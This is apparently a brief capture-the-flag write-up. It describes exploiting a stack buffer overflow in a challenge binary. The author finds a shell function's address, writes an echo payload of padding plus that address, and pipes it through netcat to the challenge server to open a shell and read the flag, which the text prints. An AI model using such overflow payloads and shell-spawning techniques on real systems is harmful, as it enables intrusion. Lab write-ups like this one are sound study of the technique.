downloaded both source code and binary from CTF website.
used WINscp to transfer file into my linux server.
the binary did not give me permission to execute when I sent it there, so I had to alter the permissions in order to execute the 
file or run gdb:

chmod +x sug4r-m4ma

gdb and ghidra showed me what address the function bash() was at
this is important because I need that shell to execute in order 
to see the file "flag".

made an input file on my own server:

echo -e "aaaaaabaaaaacaaaadaaaaab\x45\x9e\x04\x08" > input

then using netcat I piped in this file:

cat input - | nc 18.144.160.224 5000

from there I had the shell open. 
checked to see if shell was open by inputing ls command

then looked at flag file

cat flag
365CTF{finding-love-in-an-overflow}

captured flag!
